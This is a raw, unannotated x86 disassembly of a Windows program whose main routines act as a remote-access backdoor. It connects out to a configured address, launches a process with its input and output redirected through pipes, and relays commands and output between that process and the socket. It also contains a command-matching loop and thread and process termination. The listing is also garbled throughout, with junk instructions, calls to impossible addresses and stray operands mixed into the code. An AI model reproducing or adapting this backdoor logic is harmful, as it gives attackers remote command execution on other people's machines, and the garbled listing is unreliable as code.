lea ecx [ ebp - 0x250 ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
call sub_401960
add esp 0x8
test eax eax
jne r-xdata
call 0xffffffffb0cdacdc
std
[ edi ]
clc
nop
jae r-xdata
call sub_406d95
add [ ebx ] dh
ror [ ebp - 0x24f43 ] 0xff
je r-xdata
push 0x927c0
call [ Sleep@IAT ]
mov eax [ ebp - 0x250 ]
mov [ ebp - 0x3fc ] eax
cmp [ ebp - 0x3fc ] 0x3
ja r-xdata
jne r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x3fc ]
jmp [ ecx * 4 + jump_table_40225f ]
jmp r-xdata
jmp r-xdata
fld [ ebp - 0x248 ]
fmul [ r--data ]
call sub_4033b4
push eax
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
push 0x0
call sub_4032be
jmp r-xdata
add bh bh
adc eax Sleep@IAT
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3f8 ] eax
mov ecx [ ebp - 0x3f8 ]
push ecx
call sub_402c47
add esp 0x4
nop
clc
jae r-xdata
lea edx [ ebp - 0x21c ]
push edx
call sub_401b00
add esp 0x4
push 0x927c0
jne r-xdata
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x254 ] eax
cmp [ ebp - 0x254 ] 0xffffffff
jne r-xdata
call 0x6a408a67
add [ edx + 0x2 ] ebp
call [ Sleep@IAT ]
jmp r-xdata
0xe4958de8 0xfffd
call [ edx - 0x18 ]
cmp bl 0xff
inc [ ebx - 0x3f97fb3c ]
daa
or [ eax ] eax
mov [ ebp - 0x10 ] 0x2
mov ax [ ebp - 0x240 ]
push eax
call htons
mov [ ebp - 0xe ] ax
lea ecx [ ebp - 0x23c ]
push ecx
call inet_addr
mov [ ebp - 0xc ] eax
clc
nop
jae r-xdata
mov edx [ ebp - 0x254 ]
push edx
call closesocket
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x10
lea edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x254 ]
push eax
call connect
cmp eax 0xffffffff
jne r-xdata
call 0xffffffff8d508b1b
push ebp
jmp r-xdata
jb r-xdata
mov ecx [ ebp - 0x254 ]
push ecx
call closesocket
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x118 ]
jae r-xdata
jmp r-xdata
jb r-xdata
push 0x0
lea edi [ ebp - 0x118 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
lea ecx [ ebp - 0x118 ]
push ecx
mov edx [ ebp - 0x254 ]
push edx
call send
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
call 0xffffffff8d408b9f
mov ebp 0xfffffee8
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
lea edx [ ebp - 0x118 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
clc
nop
jae r-xdata
call sub_40602d
add [ ebx ] dh
ror [ ebp - 0x11743 ] 0xff
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x118 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
je r-xdata
mov eax [ ebp - 0x254 ]
push eax
call closesocket
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
push 0xff
lea ecx [ ebp - 0x118 ]
push ecx
mov edx [ ebp - 0x254 ]
push edx
call recv
mov [ ebp - 0x14 ] eax
jle r-xdata
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jg r-xdata
jmp r-xdata
mov eax [ ebp - 0x254 ]
push eax
call closesocket
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jg r-xdata
je r-xdata
call 0x2c9ed4
sldt [ eax ]
jmp r-xdata
jb r-xdata
push 0xc
push rw-data
lea edx [ ebp - 0x118 ]
push edx
call sub_403190
add esp 0xc
test eax eax
jne r-xdata
je r-xdata
jae r-xdata
push 0xb
push rw-data
lea ecx [ ebp - 0x118 ]
push ecx
call sub_403190
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
push eax
push 0x0
push sub_402420
call sub_403013
add esp 0xc
jmp r-xdata
add esp 0xc
test eax eax
jne r-xdata
push 0x8
push rw-data
lea ecx [ ebp - 0x118 ]
push ecx
call sub_403190
jne r-xdata
call 0x48a58a
add [ eax ] al
jmp r-xdata
lea edx [ ebp - 0x10d ]
mov [ ebp - 0x3e8 ] edx
mov eax [ ebp - 0x3e8 ]
push eax
call sub_402cf6
add esp 0x4
fstp [ ebp - 0x3f0 ]
mov ecx [ ebp - 0x254 ]
push ecx
call closesocket
fld [ ebp - 0x3f0 ]
fmul [ r--data ]
call sub_4033b4
push eax
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
add [ eax ] al
sub_402270
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
jb r-xdata
clc
nop
jae r-xdata
jae r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
push 0x18
call sub_4034c4
add esp 0x4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] 0x0
mov [ ebp - 0xc ] 0xc
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jb r-xdata
call 0xffffffffec85ea7b
add [ eax ] al
add [ eax ] al
call 0xffffffff834fb382
add al [ eax ]
add [ eax ] al
push 0x0
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
jae r-xdata
clc
nop
jae r-xdata
jmp r-xdata
call 0x55cd234e
hlt
push 0x0
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x18 ]
add eax 0x4
push eax
lea ecx [ ebp - 0x14 ]
push ecx
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
call 0xffffffff8d408df2
push ebp
hlt
jmp r-xdata
clc
jae r-xdata
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
call sub_4026b0
add esp 0x8
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] eax
jb r-xdata
call 0xfffffffff095af1b
jmp r-xdata
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ edx ]
push eax
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x14 ]
jae r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
jne r-xdata
call [ CloseHandle@IAT ]
je r-xdata
call 0x532c78e2
je r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
call [ CloseHandle@IAT ]
0xf07d83e8 0x7400
or cl [ ebx - 0xae0fb3 ]
adc eax CloseHandle@IAT
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov edx [ ebp - 0x18 ]
cmp [ edx + 0x4 ] 0x0
je r-xdata
jne r-xdata
push edx
push ebp
in al dx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ CloseHandle@IAT ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jae r-xdata
dec ebp
clc
nop
jae r-xdata
mov edx [ ebp - 0x14 ]
push edx
call [ CloseHandle@IAT ]
je r-xdata
call 0x12ca167
mov eax [ ebp - 0x18 ]
push eax
call sub_4033db
add esp 0x4
xor eax eax
jmp r-xdata
call 0xffffffffe885afe5
sub_402420
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
push 0x18
call sub_4034c4
add esp 0x4
mov [ ebp - 0x24 ] eax
je r-xdata
call sub_402270
jne r-xdata
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] 0x0
jae r-xdata
mov [ ebp - 0x24 ] eax
jb r-xdata
0xfe21e8e8 0xffff
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov ecx [ ebp - 0x24 ]
push ecx
push sub_402870
push 0x0
lea edx [ ebp - 0x1c ]
push edx
call [ CreateThread@IAT ]
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x10 ] eax
je r-xdata
call 0xffffffffd885b272
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
mov [ ecx + 0xc ] edx
clc
nop
jae r-xdata
call 0xd246a2a
add [ eax ] al
add bh al
inc ebp
call $+5
mov edx [ ebp - 0x24 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
jne r-xdata
clc
nop
jae r-xdata
mov eax [ ebp - 0x24 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push 0x0
mov edx [ ebp - 0x24 ]
push edx
push sub_402a40
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call [ CreateThread@IAT ]
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x14 ] eax
jb r-xdata
call 0xffffffffd88db2c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
nop
inc eax
add [ ebx + 0x4189dc4d ] cl
adc [ edi ] cl
test [ eax ] cl
add [ eax ] al
add [ edi ] cl
test [ edx ] eax
add [ eax ] al
add bl ch
jmp 0xffffffff841c7a45
mov edx [ ebp - 0x24 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
jae r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x4 ] edx
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ eax + 0xc ] 0xffffffff
push 0x0
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x14 ]
push edx
call 0xffffffff841c7a95
jpe r-xdata
push 0xffffffff
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x3
call [ WaitForMultipleObjects@IAT ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] edx
cmp [ ebp - 0x30 ] 0x0
je r-xdata
jne r-xdata
call [ TerminateThread@IAT ]
jmp r-xdata
adc al 0x52
add [ ebp + 0x1e ] dh
push 0x0
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x14 ]
push ecx
call [ TerminateThread@IAT ]
push 0x1
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x8 ]
push eax
call [ TerminateProcess@IAT ]
jmp r-xdata
sub [ ebp - 0x30 ] 0x1
cmp [ ebp - 0x30 ] 0x0
je r-xdata
jmp r-xdata
je r-xdata
push 0x0
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x10 ]
push edx
call [ TerminateThread@IAT ]
push 0x1
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x8 ]
sub [ ebp - 0x30 ] 0x1
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push ecx
call [ TerminateProcess@IAT ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0xc ]
push ecx
call closesocket
je r-xdata
jne r-xdata
push 0x0
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x14 ]
push eax
call [ TerminateThread@IAT ]
push 0x0
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x10 ]
push edx
call [ TerminateThread@IAT ]
jmp r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ edx ]
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ecx ]
push edx
call [ CloseHandle@IAT ]
je r-xdata
call 0xffffffffdc8db219
push eax
call [ DisconnectNamedPipe@IAT ]
clc
jae r-xdata
0xdc558be8 0x28b
push ecx
adc [ edx - 0x1 ] dl
adc eax TerminateThread@IAT
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ DisconnectNamedPipe@IAT ]
clc
jae r-xdata
jne r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x4 ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x24 ]
mov edx [ ecx + 0x10 ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x14 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0x8 ]
push eax
call [ CloseHandle@IAT ]
cmp [ ebp - 0x24 ] 0x0
je r-xdata
call 0xffffffffdc95b249
jmp r-xdata
mov ecx [ ebp - 0x24 ]
push ecx
call sub_4033db
add esp 0x4
sub_4026b0
push ebp
mov ebp esp
sub esp 0x70
push ebx
push esi
push edi
je r-xdata
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x68 ] 0x44
mov [ ebp - 0x64 ] 0x0
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x4c ] 0x0
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp - 0x54 ]
mov [ ebp - 0x58 ] edx
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x36 ] 0x0
mov [ ebp - 0x3c ] 0x101
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x28 ] edx
jb r-xdata
jne r-xdata
push 0x0
push 0x1
jae r-xdata
jmp sub_4026b0
nop
nop
nop
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_402c52
add esp 0x4
mov [ ebp - 0x6c ] eax
mov edx [ ebp - 0x6c ]
mov [ ebp - 0x20 ] edx
je r-xdata
jne r-xdata
push 0x2
lea eax [ ebp - 0x28 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call [ GetCurrentProcess@IAT ]
push eax
call [ DuplicateHandle@IAT ]
call 0x1aa27aa
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
jne r-xdata
jmp r-xdata
mov edi [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jb r-xdata
call 0xffffffffe0bdb3b8
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ rw-data ]
push ecx
call sub_401370
add esp 0xc
clc
jae r-xdata
0x3c3d8be8 0x40a0
add [ ebx - 0x3fcc0037 ] al
je r-xdata
inc eax
add [ eax - 0x1 ] dl
adc eax DuplicateHandle@IAT
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x70 ] ecx
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x68 ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
push 0x0
lea edx [ ebp - 0x1c ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
call 0xfffffffff085b5b6
mov edx [ ebp - 0x70 ]
push edx
call sub_402c47
add esp 0x4
nop
clc
jae r-xdata
call 0xffffffff8a20758c
dec ebp
nop
jb r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0xc ]
push ecx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x24 ]
pop edi
jae r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call 0x601c6de9
sub_402870
push ebp
mov ebp esp
sub esp 0x418
push ebx
push esi
push edi
push 0x18
call sub_4034c4
add esp 0x4
mov [ ebp - 0x418 ] eax
clc
nop
jae r-xdata
mov ecx 0x6
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x418 ]
[ edi ] [ esi ]
je r-xdata
call 0x46e281
add [ eax ] al
push 0x0
push 0x0
lea eax [ ebp - 0x410 ]
push eax
push 0x3ff
lea ecx [ ebp - 0x400 ]
push ecx
mov edx [ ebp - 0x418 ]
mov eax [ edx ]
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
jne r-xdata
mov ecx [ ebp - 0x418 ]
push ecx
call sub_4033db
add esp 0x4
push 0x0
call [ ExitThread@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x410 ] 0x0
jbe r-xdata
0x6a006ae8 0x8d00
test eax esi
sti
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
clc
nop
jae r-xdata
push 0x0
lea ecx [ ebp - 0x410 ]
push ecx
push 0x3ff
lea edx [ ebp - 0x400 ]
push edx
mov eax [ ebp - 0x418 ]
mov ecx [ eax ]
push ecx
call [ ReadFile@IAT ]
clc
nop
jae r-xdata
call 0xffffffff8d4093e4
mov edx [ ebp - 0x410 ]
mov [ ebp + edx - 0x400 ] 0x0
mov eax [ ebp - 0x410 ]
call 0xfffffffff0d5b512
sti
push rw-data
lea ecx [ ebp - 0x40c ]
push ecx
call sub_4011f0
add esp 0x8
je r-xdata
jne r-xdata
mov edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x400 ]
push eax
lea ecx [ ebp - 0x40c ]
push ecx
call sub_401310
add esp 0xc
jmp r-xdata
jne r-xdata
jmp r-xdata
je r-xdata
0xf0958be8 0xfffb
call [ edx - 0x73 ]
test [ eax ] eax
cld
add eax 0x1
mov [ ebp - 0x410 ] eax
je r-xdata
push 0x0
push 0x4
jne r-xdata
clc
nop
jae r-xdata
jmp r-xdata
push 0xa
lea edx [ ebp - 0x414 ]
push edx
mov eax [ ebp - 0x410 ]
push eax
call sub_4035fe
add esp 0xc
push eax
mov ecx [ ebp - 0x418 ]
mov edx [ ecx + 0xc ]
push edx
call send
test eax eax
jg r-xdata
call 0x4aa2a1b
mov eax [ ebp - 0x410 ]
push eax
lea ecx [ ebp - 0x400 ]
push ecx
mov edx [ ebp - 0x418 ]
mov eax [ edx + 0xc ]
push eax
call sub_401640
add esp 0xc
test eax eax
jg r-xdata
call 0xfffffffff0c5b5d4
sti
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
sub_402a40
push ebp
mov ebp esp
sub esp 0x424
push ebx
push esi
push edi
push 0x18
call sub_4034c4
add esp 0x4
mov [ ebp - 0x418 ] eax
mov ecx 0x6
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x418 ]
[ edi ] [ esi ]
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_402c52
add esp 0x4
mov [ ebp - 0x420 ] eax
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x414 ] eax
je r-xdata
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
jne r-xdata
push 0x0
push 0x3ff
lea eax [ ebp - 0x404 ]
push eax
mov ecx [ ebp - 0x418 ]
mov edx [ ecx + 0xc ]
push edx
call recv
mov [ ebp - 0x41c ] eax
cmp [ ebp - 0x41c ] 0xffffffff
je r-xdata
jae r-xdata
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov ecx [ ebp - 0x414 ]
push ecx
mov edx [ rw-data ]
push edx
call sub_401370
add esp 0xc
jb r-xdata
call 0xffffffffa0806832
inc eax
add [ ebx - 0x3fcc0037 ] al
jb r-xdata
je r-xdata
call 0xffffffffffa82b47
add eax [ eax ]
add [ ebp - 0x4037b ] cl
call [ eax - 0x75 ]
mov eax [ ebp - 0x414 ]
mov [ ebp - 0x424 ] eax
mov ecx [ ebp - 0x424 ]
push ecx
call sub_402c47
add esp 0x4
mov edx [ ebp - 0x418 ]
push edx
call sub_4033db
add esp 0x4
push 0x0
call [ ExitThread@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jae r-xdata
push rw-data
jne r-xdata
call 0xfffffffffc2cb166
mov ecx [ ebp - 0x41c ]
push ecx
lea edx [ ebp - 0x404 ]
push edx
lea eax [ ebp - 0x410 ]
push eax
call sub_401350
add esp 0xc
clc
jae r-xdata
call 0xffffffffe4cdb6d2
sti
lea eax [ ebp - 0x410 ]
push eax
call sub_4011f0
add esp 0x8
nop
clc
jae r-xdata
0xa04868e8 0x40
push 0x4
mov ecx [ ebp - 0x414 ]
push ecx
lea edx [ ebp - 0x404 ]
push edx
call sub_403190
add esp 0xc
test eax eax
jne r-xdata
call 0xffffffff8b449646
jb r-xdata
mov eax [ ebp - 0x418 ]
push eax
call sub_4033db
add esp 0x4
push 0x0
call [ ExitThread@IAT ]
push 0x0
lea ecx [ ebp - 0x4 ]
jae r-xdata
jmp r-xdata
jmp r-xdata
push ecx
mov edx [ ebp - 0x41c ]
push edx
lea eax [ ebp - 0x404 ]
push eax
mov ecx [ ebp - 0x418 ]
mov edx [ ecx + 0x4 ]
push edx
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
call 0x4dcd2c09
cld
sub_402c20
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_402c60
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_402cf6
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi [ ebp + 0x8 ]
movzx eax [ esi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ esi ]
push 0x8
push eax
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
push 0x0
push 0x0
push esi
call sub_403910
pop ecx
push eax
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_403884
fld [ eax + 0x10 ]
add esp 0x14
pop esi
leave
retn
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
sub_402d60
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_402e20
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_402ef0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov edi [ esp + 0x8 ]
push esi
test edi 0x3
push ebx
je r-xdata
mov eax [ edi ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add edi 0x4
test eax 0x81010100
je r-xdata
mov al [ edi ]
inc edi
test al al
je r-xdata
mov eax [ edi - 0x4 ]
test al al
je r-xdata
dec edi
jmp r-xdata
test edi 0x3
jne r-xdata
sub edi 0x4
test ah ah
je r-xdata
mov esi [ esp + 0x14 ]
test esi 0x3
jne r-xdata
mov dl [ esi ]
inc esi
test dl dl
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
sub edi 0x3
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
mov [ edi ] dl
inc edi
dec ecx
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
sub edi 0x2
jmp r-xdata
test eax 0xff000000
jne r-xdata
mov [ edi ] cl
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov ecx ebx
and ecx 0x3
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
test dh dh
je r-xdata
mov dl [ esi ]
inc esi
mov [ edi ] dl
inc edi
test dl dl
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edx 0xff0000
je r-xdata
pop ebx
pop esi
dec ecx
jne r-xdata
mov [ edi ] dx
xor edx edx
mov eax [ esp + 0x10 ]
mov [ edi + 0x2 ] dl
pop ebx
pop esi
pop edi
retn
test edx 0xff000000
jne r-xdata
